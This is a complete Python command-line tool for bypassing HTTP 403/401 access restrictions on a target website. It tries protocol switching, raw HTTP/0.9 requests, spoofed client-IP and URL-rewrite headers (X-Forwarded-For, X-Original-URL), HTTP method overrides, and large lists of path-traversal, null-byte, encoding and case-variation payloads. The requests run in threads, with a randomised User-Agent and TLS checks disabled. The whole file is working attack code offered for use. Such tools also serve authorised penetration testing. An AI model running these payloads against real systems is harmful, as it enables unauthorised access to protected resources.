#!/usr/bin/env python3
import requests
import sys
import argparse
import random
import string
import json
import hashlib
import time
import urllib3
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    END = '\033[0m'
    BOLD = '\033[1m'

# ---------------------------------------------------------------------------
# Globals
# ---------------------------------------------------------------------------
BASELINE = {}
RESULTS = []

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def random_user_agent():
    browsers = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
    ]
    return random.choice(browsers) + ' ' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))

def parse_custom_headers(header_list):
    custom_headers = {}
    if not header_list:
        return custom_headers
    for header in header_list:
        if ':' in header:
            key, value = header.split(':', 1)
            custom_headers[key.strip()] = value.strip()
        else:
            print(f"{colors.YELLOW}[!] Invalid header format (ignored): {header}{colors.END}")
    return custom_headers

def format_url(base_url, path):
    base_url = base_url.rstrip('/')
    if not path:
        return base_url
    path = path.lstrip('/')
    return f"{base_url}/{path}"

def get_domain(url):
    return urlparse(url).netloc.split(':')[0]

def body_signature(response):
    body = response.content or b""
    return len(body), hashlib.sha1(body).hexdigest()

def safe_request(method, url, headers=None, timeout=5, max_retries=1, verbose=False):
    for attempt in range(max_retries + 1):
        try:
            r = requests.request(
                method.upper(),
                url,
                headers=headers,
                timeout=timeout,
                allow_redirects=True,
                verify=False,
            )
            if r.status_code in (429, 503) and attempt < max_retries:
                wait = 2 ** attempt
                if verbose:
                    print(f"{colors.YELLOW}    Rate limited ({r.status_code}), backing off {wait}s{colors.END}")
                time.sleep(wait)
                continue
            return r
        except requests.exceptions.RequestException as e:
            if verbose:
                print(f"{colors.RED}    Request error: {e}{colors.END}")
            if attempt >= max_retries:
                return None
            time.sleep(0.5)
    return None

# ---------------------------------------------------------------------------
# Baseline + bypass detection
# ---------------------------------------------------------------------------
def capture_baseline(url, path, custom_headers, verbose=False):
    test_url = format_url(url, path) if path else url
    req_headers = {"User-Agent": random_user_agent()}
    if custom_headers:
        req_headers.update(custom_headers)

    r = safe_request("GET", test_url, req_headers, verbose=verbose)
    if r is None:
        BASELINE[path or ""] = None
        return

    length, h = body_signature(r)
    BASELINE[path or ""] = {"status": r.status_code, "length": length, "hash": h}

    if verbose:
        print(f"{colors.BLUE}[*] Baseline {test_url} -> {r.status_code} ({length} bytes){colors.END}")

def is_bypass(path, response):
    if response is None:
        return False
    code = response.status_code
    if code >= 400:
        return False
    if not (200 <= code < 400):
        return False

    base = BASELINE.get(path or "")
    if base is None:
        return 200 <= code < 400

    length, h = body_signature(response)
    if h == base["hash"]:
        return False
    if code == base["status"] and abs(length - base["length"]) < 32:
        return False
    return True

# ---------------------------------------------------------------------------
# Wordlists
# ---------------------------------------------------------------------------
PATH_MANIPULATION_TECHNIQUES = sorted(set([
    "{0}", "%2e/{0}", "%2f{0}/", "%2f{0}%2f", "./{0}/",
    "{0}/.", "/{0}/./", "/{0}//", "./{0}/./",
    "{0}?", "{0}.html", "{0}.php", "{0}#",
    "{0}..;/", "{0};/", "//{0}///",
    "*{0}/", "/{0}", "/{0}//",
    "{0}../", "{0}/*", ";/{0}/", "/;//{0}/",
    "{0}%00", "{0}.",
    "{0}..%2f", "{0}%20", "{0}%09", "{0}.json", "{0}.xml",
    "{0}%23", "{0}%3f", "{0}%26", "{0}%2e",
    "{0}..%00/", "{0}..%0d/", "{0}..%5c", "{0}..\\", "{0}..%ff/",
    "{0}%2e%2e%2f", "{0}.%2e/",
    "{0}??", "{0}???",
    "{0}/.randomstring", "{0}%20/", "{0}%20assets%20/",
    "{0}\\..\\.\\", "{0}/./", "{0}/*/",
    "{0}/..;/", "{0}%2e/assets", "{0}/%2e/", "{0}//.", "{0}////",
    "{0};assets/",
    # Unicode / overlong / CRLF / Windows
    "{0}%c0%af", "{0}%e0%80%af",
    "{0}%0d", "{0}%0a", "{0}%0d%0a",
    "{0}::$DATA",
    "..;/{0}", "/..;/{0}", "..%00/{0}",
    # New: whitespace / NEL trailing
    "{0}%a0", "{0}%85", "{0}%c2%a0",
    # New: backslash junk-prefix traversal
    "a/..%5c{0}", "x/..%5c{0}", "junk/..%5c{0}",
    "a/..\\{0}", "a/../{0}",
    # New: fragment prefix traversal
    "#/../{0}", "%23/../{0}", "#/{0}", "%23/{0}",
]))

BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"Host": "localhost"},
    {"X-Originally-Forwarded-For": "127.0.0.1"},
    {"From": "127.0.0.1"},
    {"Profile": "http://{domain}"},
    {"X-Arbitrary": "http://{domain}"},
    {"X-HTTP-DestinationURL": "http://{domain}"},
    {"X-Forwarded-Proto": "http://{domain}"},
    {"Destination": "127.0.0.1"},
    {"Proxy": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"Base-Url": "127.0.0.1"},
    {"Client-IP": "127.0.0.1"},
    {"Http-Url": "127.0.0.1"},
    {"Proxy-Host": "127.0.0.1"},
    {"Proxy-Url": "127.0.0.1"},
    {"Real-Ip": "127.0.0.1"},
    {"Redirect": "127.0.0.1"},
    {"Referrer": "127.0.0.1"},
    {"Request-Uri": "127.0.0.1"},
    {"Uri": "127.0.0.1"},
    {"Url": "127.0.0.1"},
    {"X-Forward-For": "127.0.0.1"},
    {"X-Forwarded-By": "127.0.0.1"},
    {"X-Forwarded-Server": "127.0.0.1"},
    {"X-Forwarded": "127.0.0.1"},
    {"X-Forwarder-For": "127.0.0.1"},
    {"X-Http-Host-Override": "127.0.0.1"},
    {"X-Original-Remote-Addr": "127.0.0.1"},
    {"X-Proxy-Url": "127.0.0.1"},
    {"X-Forwarded-Scheme": "http"},
    {"Referer": "{target}"},
    {"Origin": "{target}"},
    {"X-Requested-With": "XMLHttpRequest"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-HTTP-Method-Override": "GET"},
    {"X-HTTP-Method": "GET"},
    {"X-Method-Override": "GET"},
    {"X-Forwarded-Path": "/{path}"},
    {"X-Override-URL": "/{path}"},
]

HTTP_METHODS = [
    "GET", "POST", "PUT", "PATCH", "DELETE",
    "HEAD", "OPTIONS",
    "DEBUG", "TRACK",
]

PARAMETER_TECHNIQUES = sorted(set([
    "?", "??", "???", "?#",
    "?%23", "?%3f", "?%26", "?%20", "?%09",
    "?..", "?../", "?..%2f", "?..%00/", "?..%0d/",
    "?..%5c", "?..\\", "?..%ff/",
    "?%2e%2e%2f", "?.%2e/", "?%2e",
    "?/.", "?/.randomstring", "?.html", "?.json",
    "?%20/", "?%20assets%20/",
    "?\\..\\.\\", "?/*", "?/./", "?/*/",
    "?/..;/", "?%2e/assets", "?/%2e/", "?//.", "?////", "?;assets/",
]))

ENCODING_TEMPLATES = [
    "{0}%20", "{0}%09", "{0}%00", "{0}%0d", "{0}%0a",
    "%2e/{0}", "%2f%2f{0}", "%2f{0}", "{0}%2f",
    "{0};", "{0};/", "{0};x", "{0};x/",
    "..;/{0}", "{0}/..;/",
    "{0}%2e", "{0}%2e%2e", "{0}%2e%2e%2f",
    "{0}/.", "{0}//", "{0}///",
    "%2e/{0}/", "/{0}/.", "/{0}//", "//{0}",
    "{0}%c0%af", "{0}%e0%80%af",
    "{0}%a0", "{0}%85", "{0}%c2%a0",
]

# ---------------------------------------------------------------------------
# Test functions
# ---------------------------------------------------------------------------
def test_fuzzing(url, path=None, method="GET", headers=None, custom_headers=None, verbose=False):
    test_url = format_url(url, path) if path else url
    req_headers = {"User-Agent": random_user_agent()}
    if custom_headers:
        req_headers.update(custom_headers)
    if headers:
        processed = headers.copy()
        for k, v in processed.items():
            if v and isinstance(v, str):
                if "{domain}" in v:
                    processed[k] = v.replace("{domain}", get_domain(url))
                if "{target}" in v:
                    processed[k] = v.replace("{target}", url)
                if "{path}" in v:
                    processed[k] = v.replace("{path}", (path or "").lstrip('/'))
        req_headers.update(processed)

    if any(c.isspace() for c in method):
        return False, 0, None, None, None

    if verbose:
        print(f"{colors.BLUE}[*] {method} {test_url}{colors.END}")

    try:
        r = safe_request(method, test_url, req_headers, verbose=verbose)
    except ValueError:
        return False, 0, None, None, None

    if is_bypass(path, r):
        return True, r.status_code, method, req_headers, path
    return False, 0, None, None, None

def test_protocol_switch(url, path, custom_headers, verbose):
    base_url = url.replace('https://', 'http://') if url.startswith('https://') else url.replace('http://', 'https://')
    test_url = format_url(base_url, path) if path else base_url
    req_headers = {"User-Agent": random_user_agent()}
    if custom_headers:
        req_headers.update(custom_headers)
    if verbose:
        print(f"{colors.BLUE}[*] Protocol switch: {test_url}{colors.END}")
    r = safe_request("GET", test_url, req_headers, verbose=verbose)
    if is_bypass(path, r):
        return True, r.status_code, "GET", req_headers, path, test_url
    return False, 0, None, None, None, None

def test_port_bypass(url, path, custom_headers, verbose):
    test_url = format_url(url, path) if path else url
    for port in [80, 443, 8080, 8443, 4443]:
        h = {"User-Agent": random_user_agent(), "X-Forwarded-Port": str(port)}
        if custom_headers:
            h.update(custom_headers)
        if verbose:
            print(f"{colors.BLUE}[*] Port: {port} {test_url}{colors.END}")
        r = safe_request("GET", test_url, h, verbose=verbose)
        if is_bypass(path, r):
            return True, r.status_code, "GET", h, path
    return False, 0, None, None, None

def test_method_override(url, path, custom_headers, verbose):
    if not path:
        return False, 0, None, None, None
    test_url = format_url(url, path)
    override_headers = [
        {"X-HTTP-Method-Override": "GET"},
        {"X-HTTP-Method": "GET"},
        {"X-Method-Override": "GET"},
    ]
    for oh in override_headers:
        for verb in ("POST", "PUT"):
            h = {"User-Agent": random_user_agent(), **oh}
            if custom_headers:
                h.update(custom_headers)
            if verbose:
                print(f"{colors.BLUE}[*] Method override: {verb} {test_url} | {oh}{colors.END}")
            r = safe_request(verb, test_url, h, verbose=verbose)
            if is_bypass(path, r):
                return True, r.status_code, verb, h, path
    return False, 0, None, None, None

def test_http_0_9(url, path, verbose):
    try:
        import socket
        parsed = urlparse(url)
        host = parsed.hostname
        is_https = url.startswith('https://')
        port = parsed.port or (443 if is_https else 80)
        eff = f"/{path.lstrip('/')}" if path else "/"

        if verbose:
            print(f"{colors.BLUE}[*] HTTP/0.9: {host}:{port}{eff}{colors.END}")

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        if is_https:
            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)

        s.connect((host, port))
        s.sendall(f"GET {eff}\r\n".encode())
        data = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
                if len(data) > 8192:
                    break
        except socket.timeout:
            pass
        s.close()

        if data and not data.startswith(b"HTTP/"):
            return True, 200, "HTTP/0.9", None, eff
    except Exception as e:
        if verbose:
            print(f"{colors.RED}    HTTP/0.9 error: {e}{colors.END}")
    return False, 0, None, None, None

def test_root_header_override(url, path, custom_headers, verbose):
    if not path:
        return []
    eff = path if path.startswith('/') else f"/{path}"
    root_url = url.rstrip('/') + '/'
    results = []
    for header_name in ("X-Original-URL", "X-Rewrite-URL", "X-Override-URL", "X-Forwarded-Path"):
        h = {"User-Agent": random_user_agent(), header_name: eff}
        if custom_headers:
            h.update(custom_headers)
        if verbose:
            print(f"{colors.BLUE}[*] Root override GET / | {header_name}: {eff}{colors.END}")
        r = safe_request("GET", root_url, h, verbose=verbose)
        if r and is_bypass(path, r):
            results.append((True, r.status_code, "GET", h, eff, root_url, header_name))
    return results

# ---------------------------------------------------------------------------
# Output
# ---------------------------------------------------------------------------
def print_status(url, status_code, method, headers, path, extra_note=None):
    full_url = format_url(url, path) if path else url
    print(f"\n{colors.GREEN}[+] BYPASS{colors.END}")
    print(f"URL: {full_url}")
    print(f"Method: {colors.BOLD}{method}{colors.END}")
    print(f"Status: {colors.BOLD}{status_code}{colors.END}")
    if extra_note:
        print(f"Note: {colors.BOLD}{extra_note}{colors.END}")
    if headers:
        print("Headers:")
        for k, v in headers.items():
            if v:
                print(f"  {k}: {v}")
    print("-" * 50)

    RESULTS.append({
        "url": full_url,
        "method": method,
        "status": status_code,
        "headers": {k: v for k, v in (headers or {}).items()},
        "note": extra_note,
    })

def load_wordlist(wordlist_file):
    try:
        with open(wordlist_file, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{colors.RED}[!] Wordlist file not found: {wordlist_file}{colors.END}")
        sys.exit(1)

# ---------------------------------------------------------------------------
# Orchestration
# ---------------------------------------------------------------------------
def run_tests(target_url, path, custom_headers=None, threads=20, verbose=False):
    eff_path = path if path is not None else ""

    # 1. Baseline
    if verbose:
        print(f"\n{colors.BOLD}[*] Phase 1/9: Baseline{colors.END}")
    capture_baseline(target_url, eff_path, custom_headers, verbose)

    # 2. Protocol switch
    if verbose:
        print(f"\n{colors.BOLD}[*] Phase 2/9: Protocol switch{colors.END}")
    s, code, m, h, p, new_url = test_protocol_switch(target_url, eff_path, custom_headers, verbose)
    if s:
        print_status(new_url, code, m, h, "")

    # 3. HTTP/0.9
    if verbose:
        print(f"\n{colors.BOLD}[*] Phase 3/9: HTTP/0.9{colors.END}")
    s, code, m, h, p = test_http_0_9(target_url, eff_path, verbose)
    if s:
        print_status(target_url, code, m, h, p, extra_note="Raw HTTP/0.9 response")

    # 4. Port bypass
    if verbose:
        print(f"\n{colors.BOLD}[*] Phase 4/9: Port bypass{colors.END}")
    s, code, m, h, p = test_port_bypass(target_url, eff_path, custom_headers, verbose)
    if s:
        print_status(target_url, code, m, h, p)

    # 5. Root header override
    if eff_path:
        if verbose:
            print(f"\n{colors.BOLD}[*] Phase 5/9: Root header override{colors.END}")
        for result in test_root_header_override(target_url, eff_path, custom_headers, verbose):
            found, code, m, h, matched_path, root_url, header_name = result
            if found:
                print_status(root_url, code, m, h, "",
                             extra_note=f"{header_name}: {matched_path} (sent to /)")

    # 6. HTTP methods
    if verbose:
        print(f"\n{colors.BOLD}[*] Phase 6/9: HTTP methods{colors.END}")
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = [ex.submit(test_fuzzing, target_url, eff_path, mth, None, custom_headers, verbose)
                   for mth in HTTP_METHODS if not any(c.isspace() for c in mth)]
        for f in futures:
            try:
                s, code, m, h, p = f.result()
                if s:
                    print_status(target_url, code, m, h, p)
            except Exception:
                pass

    # 7. Method override
    if eff_path:
        if verbose:
            print(f"\n{colors.BOLD}[*] Phase 7/9: Method override{colors.END}")
        s, code, m, h, p = test_method_override(target_url, eff_path, custom_headers, verbose)
        if s:
            print_status(target_url, code, m, h, p, extra_note="Method override header")

    # 8. Header bypass
    if verbose:
        print(f"\n{colors.BOLD}[*] Phase 8/9: Header bypass{colors.END}")
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = [ex.submit(test_fuzzing, target_url, eff_path, "GET", header.copy(), custom_headers, verbose)
                   for header in BYPASS_HEADERS]
        for f in futures:
            try:
                s, code, _, h, p = f.result()
                if s:
                    print_status(target_url, code, "GET", h, p)
            except Exception:
                pass

    # 9. Path/encoding/case (parallel mega-phase)
    if eff_path:
        if verbose:
            print(f"\n{colors.BOLD}[*] Phase 9/9: Path / encoding / case (parallel){colors.END}")

        eff = eff_path.lstrip('/')
        base_url = target_url.rstrip('/')
        phase_jobs = []  # (label, full_url, display_path)

        # Path manipulation techniques
        for technique in PATH_MANIPULATION_TECHNIQUES:
            try:
                modified = technique.format(eff)
                if not modified.startswith('/'):
                    modified = f"/{modified}"
                phase_jobs.append(("path", format_url(target_url, modified), modified))
            except (IndexError, KeyError):
                continue

        # Parameter pollution
        for technique in PARAMETER_TECHNIQUES:
            phase_jobs.append(("param", f"{base_url}/{eff}{technique}", f"{eff}{technique}"))

        # Encoding templates
        for tpl in ENCODING_TEMPLATES:
            encoded = tpl.format(eff)
            phase_jobs.append(("enc", format_url(target_url, encoded), encoded))

        # Char-by-char encoding: %hex (single), %25hex (double), %5cu00hex (\uXXXX)
        for i, ch in enumerate(eff):
            if not ch.isalnum():
                continue
            hex_l = format(ord(ch), '02x')
            hex_u = hex_l.upper()
            for variant in (
                eff[:i] + f"%{hex_l}" + eff[i+1:],
                eff[:i] + f"%{hex_u}" + eff[i+1:],
                eff[:i] + f"%25{hex_l}" + eff[i+1:],
                eff[:i] + f"%25{hex_u}" + eff[i+1:],
                # \u escape (literal %5cu00XX in the path)
                eff[:i] + f"%5cu00{hex_l}" + eff[i+1:],
                eff[:i] + f"%5cu00{hex_u}" + eff[i+1:],
                eff[:i] + f"\\u00{hex_l}" + eff[i+1:],
            ):
                phase_jobs.append(("char", format_url(target_url, variant), variant))

        # Case variations
        case_variants = {
            eff.upper(),
            eff.lower(),
            eff.capitalize(),
            eff.swapcase(),
            ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(eff)),
        }
        case_variants.discard(eff)
        for variant in case_variants:
            phase_jobs.append(("case", format_url(target_url, variant), variant))

        notes = {
            "path": "Path manipulation",
            "param": "Parameter pollution",
            "enc": "Encoding template",
            "char": "Char-by-char URL encoding",
            "case": "Case variation",
        }

        def _job(label, url_, display_path):
            h = {"User-Agent": random_user_agent()}
            if custom_headers:
                h.update(custom_headers)
            if verbose:
                print(f"{colors.BLUE}[*] [{label}] GET {url_}{colors.END}")
            r = safe_request("GET", url_, h, verbose=verbose)
            if is_bypass(eff_path, r):
                return label, r.status_code, h, display_path
            return None

        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = [ex.submit(_job, *job) for job in phase_jobs]
            for f in futures:
                try:
                    res = f.result()
                    if res:
                        label, code, h, display = res
                        print_status(target_url, code, "GET", h, display, extra_note=notes[label])
                except Exception:
                    pass

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(description='Advanced 403/401 Bypass Testing Tool')
    parser.add_argument('url', help='Target URL')
    parser.add_argument('paths', nargs='?', default=None, help='Paths to test (comma-separated)')
    parser.add_argument('-w', '--wordlist', help='Wordlist of paths')
    parser.add_argument('-H', '--header', action='append', dest='headers',
                        help='Custom HTTP header "Header: Value" (repeatable)')
    parser.add_argument('-v', '--verbose', action='store_true')
    parser.add_argument('-t', '--threads', type=int, default=20)
    parser.add_argument('-o', '--output', help='Save findings to JSON file')
    args = parser.parse_args()

    if not args.url.startswith(('http://', 'https://')):
        args.url = f'https://{args.url}'
    target_url = args.url.rstrip('/')

    custom_headers = parse_custom_headers(args.headers)
    if custom_headers and args.verbose:
        print(f"{colors.BLUE}[*] Custom headers:{colors.END}")
        for k, v in custom_headers.items():
            print(f"  {k}: {v}")

    if args.wordlist:
        paths = load_wordlist(args.wordlist)
        for path in paths:
            if args.verbose:
                print(f"\n{colors.BOLD}[*] Path: {path}{colors.END}")
            run_tests(target_url, path, custom_headers, args.threads, args.verbose)
    elif args.paths:
        for path in [p.strip() for p in args.paths.split(',')]:
            if args.verbose:
                print(f"\n{colors.BOLD}[*] Path: {path}{colors.END}")
            run_tests(target_url, path, custom_headers, args.threads, args.verbose)
    else:
        run_tests(target_url, None, custom_headers, args.threads, args.verbose)

    if args.output:
        with open(args.output, 'w') as f:
            json.dump(RESULTS, f, indent=2)
        print(f"\n{colors.GREEN}[+] {len(RESULTS)} finding(s) saved to {args.output}{colors.END}")
    else:
        print(f"\n{colors.BOLD}[*] Total findings: {len(RESULTS)}{colors.END}")

if __name__ == "__main__":
    main()
